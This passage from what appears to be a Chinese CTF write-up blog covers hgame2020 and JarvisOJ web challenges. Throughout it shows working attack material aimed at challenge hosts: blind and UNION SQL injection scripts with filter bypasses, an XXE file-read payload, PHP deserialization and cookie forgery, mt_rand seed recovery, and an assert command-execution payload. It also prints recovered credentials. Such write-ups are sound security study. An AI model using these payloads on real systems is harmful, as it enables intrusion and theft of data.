class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Rank</span></span><br><span class=\"hljs-class\"></span>&#123;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$rank</span> = <span class=\"hljs-number\">1</span>;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$serverKey</span>;     <span class=\"hljs-comment\">// 服务器的 Key</span><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$key</span>;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>)</span>&#123;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;key = &amp;<span class=\"hljs-keyword\">$this</span>-&gt;serverKey;<br>    &#125;<br>&#125;<br><br><span class=\"hljs-variable\">$a</span> = <span class=\"hljs-keyword\">new</span> Rank();<br><span class=\"hljs-variable\">$encryptKey</span> = <span class=\"hljs-string\">&quot;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&quot;</span>;<br><span class=\"hljs-variable\">$playername</span> = <span class=\"hljs-string\">&quot;%s&quot;</span>;<br><span class=\"hljs-variable\">$data</span> = [<span class=\"hljs-variable\">$playername</span>, <span class=\"hljs-variable\">$encryptKey</span>];<br><span class=\"hljs-variable\">$sign</span> = <span class=\"hljs-string\">&quot;&quot;</span>;<br><span class=\"hljs-keyword\">foreach</span>(<span class=\"hljs-variable\">$data</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-variable\">$key</span> =&gt; <span class=\"hljs-variable\">$value</span>)&#123;<br>    <span class=\"hljs-variable\">$sign</span> .= md5(<span class=\"hljs-variable\">$sign</span> . <span class=\"hljs-variable\">$value</span>);<br>&#125;<br><br><span class=\"hljs-variable\">$sign</span> = md5(serialize(<span class=\"hljs-variable\">$a</span>) . <span class=\"hljs-variable\">$sign</span>);<br><br><span class=\"hljs-variable\">$sign</span> = base64_encode(serialize(<span class=\"hljs-variable\">$a</span>) . <span class=\"hljs-variable\">$sign</span>);<br><br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$sign</span>;<br></code></pre></td></tr></table></figure>\n<p>改一下 cookie 就拿到了 flag</p>\n<h2 id=\"二发入魂\"><a class=\"markdownIt-Anchor\" href=\"#二发入魂\">#</a> 二发入魂</h2>\n<p>打开题目一脸懵逼，不知道在干什么，也不知道要干什么，看了 WP 才知道好像是要通过生成的随机数来还原 seed，难怪图片说赶快交出种子。。有两种方法可以拿到 seed，一种是通过得知</p>\n<ol>\n<li>从 mt_rand () 获取 2 个值：R000 以及 R227，中间间隔 226 个值；此外还需知道 R000 之前已生成的值的个数（用 i 表示）；</li>\n<li>根据这些值算出加扰状态值；</li>\n<li>异或这些状态值，推测出原始的状态值（s228）；</li>\n<li>根据 s228，推测出 s0，获取种子。<br>\n<a href=\"https://www.anquanke.com/post/id/196831\">https://www.anquanke.com/post/id/196831</a><br>\n 还有一种是通过 php 的 php_mt_seed 函数直接爆破 seed<br>\n<a href=\"https://www.freebuf.com/vuls/192012.html\">https://www.freebuf.com/vuls/192012.html</a></li>\n</ol>\n<p>放一个网上的 exp：</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">import requests<br>import os<br>s = requests<span class=\"hljs-selector-class\">.session</span>()<br>url = <span class=\"hljs-string\">&quot;https://twoshot.hgame.n3ko.co/random.php?times=228&quot;</span><br>cookie = &#123;<span class=\"hljs-string\">&#x27;PHPSESSID&#x27;</span>:<span class=\"hljs-string\">&#x27;lf08on0tsqpggqqvulpsg278h1&#x27;</span>&#125;<br>c = s<span class=\"hljs-selector-class\">.get</span>(url,cookies = cookie)<br>ans = str(c.text)<br>ans = eval(ans)<br>R0 = ans<span class=\"hljs-selector-attr\">[0]</span><br>R227 = ans<span class=\"hljs-selector-attr\">[227]</span><br>req = <span class=\"hljs-string\">&#x27;python reverse_mt_rand.py &#x27;</span>+str(R0)+<span class=\"hljs-string\">&#x27; &#x27;</span>+str(R227)+<span class=\"hljs-string\">&#x27; 0 0&#x27;</span><br><span class=\"hljs-selector-tag\">p</span> = os<span class=\"hljs-selector-class\">.popen</span>(req)<br>x = <span class=\"hljs-selector-tag\">p</span><span class=\"hljs-selector-class\">.read</span>()<br><span class=\"hljs-selector-tag\">p</span><span class=\"hljs-selector-class\">.close</span>()<br>x = str(x<span class=\"hljs-selector-class\">.replace</span>(<span class=\"hljs-string\">&#x27;\\n&#x27;</span>,<span class=\"hljs-string\">&#x27;&#x27;</span>))<br>url2 = <span class=\"hljs-string\">&quot;https://twoshot.hgame.n3ko.co/verify.php&quot;</span><br>data = &#123;<span class=\"hljs-string\">&quot;ans&quot;</span>:x&#125;<br>final = s<span class=\"hljs-selector-class\">.post</span>(url = url2,cookies = cookie,data = data)<br><span class=\"hljs-function\"><span class=\"hljs-title\">print</span><span class=\"hljs-params\">(final.text)</span></span><br><br></code></pre></td></tr></table></figure>\n<h2 id=\"cosmos的二手市场\"><a class=\"markdownIt-Anchor\" href=\"#cosmos的二手市场\">#</a> Cosmos 的二手市场</h2>\n<p>条件竞争的题目，用 burp 发包，买入比卖出少一些，刷余额</p>\n<h2 id=\"cosmos的留言板-2\"><a class=\"markdownIt-Anchor\" href=\"#cosmos的留言板-2\">#</a> Cosmos 的留言板 - 2</h2>\n<p>发现删除留言部分存在 sql 注入，由于没有回显，只能盲注<br>\n<img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/3.png\" alt=\"3\" class=\"lazyload\"></p>\n<p>时间盲注脚本：</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">import requests<br>import time<br><br>url = &quot;http://139.199.182.61:19999/index.php?method=<span class=\"hljs-keyword\">delete</span>&amp;delete_id=<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">test = &quot;</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">database</span>()<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">schema = &quot;</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span>schema_name<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">from</span><span class=\"hljs-comment\">/**/</span>information_schema.schemata<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">limit</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">table = &quot;</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span>group_concat(table_name)<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">from</span><span class=\"hljs-comment\">/**/</span>information_schema.tables<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">where</span><span class=\"hljs-comment\">/**/</span>table_schema=<span class=\"hljs-keyword\">database</span>()<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">limit</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">column = &quot;</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span>group_concat(column_name)<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">from</span><span class=\"hljs-comment\">/**/</span>information_schema.columns<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">where</span><span class=\"hljs-comment\">/**/</span>table_name=<span class=\"hljs-string\">&#x27;user&#x27;</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">limit</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">data = &quot;</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span>concat_ws(<span class=\"hljs-number\">0x5e</span>,name,<span class=\"hljs-keyword\">password</span>)<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">from</span><span class=\"hljs-comment\">/**/</span>babysql.<span class=\"hljs-keyword\">user</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">limit</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">result = &quot;</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">cookie = &#123;&#x27;PHPSESSID&#x27;:&#x27;9g4b91gspvooe2up4k2blubbqo&#x27;&#125;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">for i in range(1,20):</span><br><span class=\"hljs-string\">\tfor j in range(33,127):</span><br><span class=\"hljs-string\">\t\tpayload = url + &quot;</span><span class=\"hljs-keyword\">if</span>(ascii(<span class=\"hljs-built_in\">substr</span>((&#123;&#125;),&#123;&#125;,<span class=\"hljs-number\">1</span>))=&#123;&#125;,sleep(<span class=\"hljs-number\">5</span>),<span class=\"hljs-number\">1</span>)--+<span class=\"hljs-string\">&quot;.format(data,i,j)</span><br><span class=\"hljs-string\">\t\tprint(chr(j))</span><br><span class=\"hljs-string\">\t\tt1 = time.time()</span><br><span class=\"hljs-string\">\t\tr = requests.get(payload,cookies = cookie)</span><br><span class=\"hljs-string\">\t\tt2 = time.time()</span><br><span class=\"hljs-string\">\t\tif(t2-t1&gt;=5):</span><br><span class=\"hljs-string\">\t\t\tresult+=chr(j)</span><br><span class=\"hljs-string\">\t\t\tprint(result)</span><br><span class=\"hljs-string\">\t\t\tbreak</span><br><span class=\"hljs-string\"></span><br></code></pre></td></tr></table></figure>\n<p>拿到账号密码，但是登陆提示错误，不知道是什么原因，多跑几次才拿到了正确的账号密码：cosmos^f1FXOCnj26Fkadzt4Sqynf6O7CgR</p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2019/11/27/JarvisOj/",
            "url": "http://blog.m1n.me/2019/11/27/JarvisOj/",
            "title": "JarvisOj",
            "date_published": "2019-11-27T14:22:21.000Z",
            "content_html": "<p><a href=\"https://www.jarvisoj.com/\">https://www.jarvisoj.com/</a></p>\n<span id=\"more\"></span>\n<h1 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> Web</h1>\n<h2 id=\"localhost\"><a class=\"markdownIt-Anchor\" href=\"#localhost\">#</a> LocalHost</h2>\n<p>抓包加一个 “X-Forwarded-For: 127.0.0.1&quot; 完事</p>\n<h2 id=\"port51\"><a class=\"markdownIt-Anchor\" href=\"#port51\">#</a> PORT51</h2>\n<p>刚开始以为改端口就完了，，后来发现是我太菜了，要改我们的访问端口<br>\n <code>curl --loacl-port 51 http://web.jarvisoj.com:32770/</code>  就拿到了 flag，，学到了</p>\n<h2 id=\"神盾局的秘密\"><a class=\"markdownIt-Anchor\" href=\"#神盾局的秘密\">#</a> 神盾局的秘密</h2>\n<p>进去以后就是一张图片<br>\n先 view-source 一下看到了：<br>\n <code>&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</code> <br>\n 看到了一个 showimg.php，看样子应该可以用 img 这个参数来读文件，先读一下 showimg.php 这个文件，没看到啥有用的东西，再看一下 index.php 看到了有一个反序列化的点，看样子是反序列化的题目，源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> <br>\t<span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-string\">&#x27;shield.php&#x27;</span>);<br>\t<span class=\"hljs-variable\">$x</span> = <span class=\"hljs-keyword\">new</span> Shield();<br>\t<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;class&#x27;</span>]) &amp;&amp; <span class=\"hljs-variable\">$g</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;class&#x27;</span>];<br>\t<span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-keyword\">empty</span>(<span class=\"hljs-variable\">$g</span>)) &#123;<br>\t\t<span class=\"hljs-variable\">$x</span> = unserialize(<span class=\"hljs-variable\">$g</span>);<br>\t&#125;<br>\t<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$x</span>-&gt;readfile();<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>看到了 shield.php，读一下看看：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>\t<span class=\"hljs-comment\">//flag is in pctf.php</span><br>\t<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Shield</span> </span>&#123;<br>\t\t<span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$file</span>;<br>\t\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$filename</span> = <span class=\"hljs-string\">&#x27;&#x27;</span></span>) </span>&#123;<br>\t\t\t<span class=\"hljs-keyword\">$this</span> -&gt; file = <span class=\"hljs-variable\">$filename</span>;<br>\t\t&#125;<br>\t\t<br>\t\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">readfile</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>\t\t\t<span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-keyword\">empty</span>(<span class=\"hljs-keyword\">$this</span>-&gt;file) &amp;&amp; stripos(<span class=\"hljs-keyword\">$this</span>-&gt;file,<span class=\"hljs-string\">&#x27;..&#x27;</span>)===<span class=\"hljs-literal\">FALSE</span>  <br>\t\t\t&amp;&amp; stripos(<span class=\"hljs-keyword\">$this</span>-&gt;file,<span class=\"hljs-string\">&#x27;/&#x27;</span>)===<span class=\"hljs-literal\">FALSE</span> &amp;&amp; stripos(<span class=\"hljs-keyword\">$this</span>-&gt;file,<span class=\"hljs-string\">&#x27;\\\\&#x27;</span>)==<span class=\"hljs-literal\">FALSE</span>) &#123;<br>\t\t\t\t<span class=\"hljs-keyword\">return</span> @file_get_contents(<span class=\"hljs-keyword\">$this</span>-&gt;file);<br>\t\t\t&#125;<br>\t\t&#125;<br>\t&#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Shield</span></span>&#123;<br>\t<span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$file</span>=<span class=\"hljs-string\">&#x27;pctf.php&#x27;</span>;<br>&#125;<br><span class=\"hljs-variable\">$c</span> = <span class=\"hljs-keyword\">new</span> Shield();<br><span class=\"hljs-keyword\">echo</span> serialize(<span class=\"hljs-variable\">$c</span>);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>“view-source:<a href=\"http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:%7Bs:4:%22file%22;s:8:%22pctf.php%22;%7D\">http://web.jarvisoj.com:32768/index.php?class=O:6:“Shield”:1:{s:4:“file”;s:8:“pctf.php”;}</a>”<br>\n 就拿到了 flag</p>\n<h2 id=\"login\"><a class=\"markdownIt-Anchor\" href=\"#login\">#</a> Login</h2>\n<p>提示说需要密码才能拿到 flag，，但是测试了一下发现当输入双引号的时候会报 sql 错误，应该是存在 sql 注入，但是测试了好久没发现有什么用，，看了一眼 wp 要先抓包，，在 head 里面有 hint。。。<br>\n‘Hint: &quot;select * from  <code>admin</code>  where password=’&quot;.md5($pass,true).&quot;’&quot;’<br>\n然后想到应该是 md5 的安全问题，0e 开头的问题应该是不存在，参考了一下 https://www.cnblogs.com/piaomiaohongchen/p/10659359.html<br>\n 试了一下文中给出的密码 ffifdyop 就拿到了 flag</p>\n<h2 id=\"admin\"><a class=\"markdownIt-Anchor\" href=\"#admin\">#</a> admin</h2>\n<p>打开网页只有一个 hello world，查看网页源代码没看到啥有用的东西，于是就看看有没有 robots.txt，看到了 admin_s3cr3t.php，访问拿到假的 flag，想了想应该是跟 cookie 有关，于是就抓包看看，应该是在 cookie 有判断是不是 admin，但是我抓到的包没有 cookie，反而是看到一个类似于 base64 的一串编码，就一直在搞这个也没搞出个啥，后来看了一下 wp 别人就有抓到 admin=0.。。。我就重新刷新重新抓了一下包才看到了这玩意，，改成 1 就拿到了 flag，看来应该是还没有设置 cookie 就被我抓包了，，，害，下次注意</p>\n<h2 id=\"in-a-mess\"><a class=\"markdownIt-Anchor\" href=\"#in-a-mess\">#</a> IN A mess</h2>\n<p>1. 查看网页源代码让我访问 index.phps，看到源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br>error_reporting(<span class=\"hljs-number\">0</span>);<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;!--index.phps--&gt;&quot;</span>;<br><br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>])<br>&#123;<br>\theader(<span class=\"hljs-string\">&#x27;Location: index.php?id=1&#x27;</span>);<br>\t<span class=\"hljs-keyword\">exit</span>();<br>&#125;<br><span class=\"hljs-variable\">$id</span>=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>];<br><span class=\"hljs-variable\">$a</span>=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;a&#x27;</span>];<br><span class=\"hljs-variable\">$b</span>=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;b&#x27;</span>];<br><span class=\"hljs-keyword\">if</span>(stripos(<span class=\"hljs-variable\">$a</span>,<span class=\"hljs-string\">&#x27;.&#x27;</span>))<br>&#123;<br>\t<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&#x27;Hahahahahaha&#x27;</span>;<br>\t<span class=\"hljs-keyword\">return</span> ;<br>&#125;<br><span class=\"hljs-variable\">$data</span> = @file_get_contents(<span class=\"hljs-variable\">$a</span>,<span class=\"hljs-string\">&#x27;r&#x27;</span>);<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$data</span>==<span class=\"hljs-string\">&quot;1112 is a nice lab!&quot;</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$id</span>==<span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> strlen(<span class=\"hljs-variable\">$b</span>)&gt;<span class=\"hljs-number\">5</span> <span class=\"hljs-keyword\">and</span> eregi(<span class=\"hljs-string\">&quot;111&quot;</span>.substr(<span class=\"hljs-variable\">$b</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-string\">&quot;1114&quot;</span>) <span class=\"hljs-keyword\">and</span> substr(<span class=\"hljs-variable\">$b</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>)!=<span class=\"hljs-number\">4</span>)<br>&#123;<br>\t<span class=\"hljs-keyword\">require</span>(<span class=\"hljs-string\">&quot;flag.txt&quot;</span>);<br>&#125;<br><span class=\"hljs-keyword\">else</span><br>&#123;<br>\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">&quot;work harder!harder!harder!&quot;</span>;<br>&#125;<br><br><br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>可以看到主要就是那一层 if</p>\n<ol>\n<li>$data 用 php://input 传进去</li>\n<li>id=0</li>\n<li>b 长度要大于 5 但是要满足第二、三层要长度为 0，这时候就要让 b=%0011111，strlen 不会被截断，substr 会被截断</li>\n<li>然后让我们访问 http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1，又看到了 id=1，有可能是注入</li>\n<li>用单引号测试发现直接返回了 sql 语句，那看来应该就是 sql 注入了</li>\n<li>测试发现过滤了空格这个可以用注释符 /**/ 绕过，但是发现直接用会被过滤，试着往里面加点东西就好了</li>\n<li>用 <code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3#</code> 测试得到字段数为 3</li>\n<li>用 <code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,database()/*1*/#</code> 拿到数据库名是 test</li>\n<li>用 <code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,table_name/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x74657374#</code> 拿到表名 content</li>\n<li>用 <code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74#</code> 得到字段名是 id,context,title</li>\n<li>用 <code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(context)/*1*/frofromm/*1*/content#</code> 拿到 flag</li>\n</ol>\n<h2 id=\"api调用\"><a class=\"markdownIt-Anchor\" href=\"#api调用\">#</a> api 调用</h2>\n<p>由于默认传输是 json 格式，先抓包把格式改成 xml，然后传 payload`<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?></p>\n <!DOCTYPE foo [\n <!ENTITY myentity SYSTEM \"file:///home/ctf/flag.txt\" >]>\n<p><abc>&amp;myentity;</abc>` 就拿到了 flag</p>\n<h2 id=\"web-2\"><a class=\"markdownIt-Anchor\" href=\"#web-2\">#</a> WEB？</h2>\n<p>一开始还看不懂题目要干嘛，然后查看源代码看到一堆 Js，然后用谷歌插件美化一下（安利一下 JavaScript and CSS Code Beautifier），方便看代码。然后发现有两万行的代码。。。。看 WP 知道了用 password 关键词来开始审计。大概就是矩阵 A*B=C, 已知 B，C 求 A。（线代知识早就忘得差不多了）</p>\n<h2 id=\"babyphp\"><a class=\"markdownIt-Anchor\" href=\"#babyphp\">#</a> babyphp</h2>\n<p>攻防世界原题，先是 githack 拿到源码，然后 assert 任意代码执行拿到 flag，用’) 闭合然后任意执行代码<br>\n payload： <code>?page=2') or system(&quot;cat templates/flag.php&quot;);//</code></p>\n<h2 id=\"inject\"><a class=\"markdownIt-Anchor\" href=\"#inject\">#</a> inject</h2>\n<p>提示说先拿到源码再说，看了 WP 知道要试常见的备份文件名，常见的备份文件临时文件名，比如.bak、.swp、.save、<sub>等，然后这一题是在 index.php</sub>… 拿到源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-keyword\">require</span>(<span class=\"hljs-string\">&quot;config.php&quot;</span>);<br><span class=\"hljs-variable\">$table</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;table&#x27;</span>]?<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;table&#x27;</span>]:<span class=\"hljs-string\">&quot;test&quot;</span>;<br><span class=\"hljs-variable\">$table</span> = Filter(<span class=\"hljs-variable\">$table</span>);<br>mysqli_query(<span class=\"hljs-variable\">$mysqli</span>,<span class=\"hljs-string\">&quot;desc `secret_<span class=\"hljs-subst\">&#123;$table&#125;</span>`&quot;</span>) <span class=\"hljs-keyword\">or</span> Hacker();<br><span class=\"hljs-variable\">$sql</span> = <span class=\"hljs-string\">&quot;select &#x27;flag&#123;xxx&#125;&#x27; from secret_<span class=\"hljs-subst\">&#123;$table&#125;</span>&quot;</span>;<br><span class=\"hljs-variable\">$ret</span> = sql_query(<span class=\"hljs-variable\">$sql</span>);<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$ret</span>[<span class=\"hljs-number\">0</span>];<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p luckyGame~=\"\">应该是 sql 注入的题目，先是要成功执行 desc  <code>secret_&#123;$table&#125;</code> ，然后利用下面的 sql 语句拿到 flag。desc table_name 需要表存在，这样就限制了注入，因此应该就是要在这里下功夫。<br>\n因为 desc  <code>test</code>   <code>aaa</code> , 只要第一个表存在就会执行，但是如果是单引号就不会执行，这一要考核的应该就是这个点。然后就可以构造 payload：&quot;?table=test <code> </code> union select database () limit 1,1&quot; 拿到数据库名 61d300，注意要加 limit，不然直会返回 D。然后构造 payload：“?table=test <code> </code> union select table_name from information_schema.tables where table_schema=0x363164333030 limit 1,1”，拿到表名 secret_flag，注意用十六进制过 waf。同样办法拿到列名 flagUwillNeverKnow，然后拿到 flag：flag</p>\n<h2 id=\"phpinfo\"><a class=\"markdownIt-Anchor\" href=\"#phpinfo\">#</a> phpinfo</h2>\n<p>session 的序列化方法不同导致的漏洞，还有就是如何往 session 里加入 payload</p>\n<h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> RE？</h2>\n<p>下载了个 udf.so 文件，不知道这是啥就上网搜了一下，<a 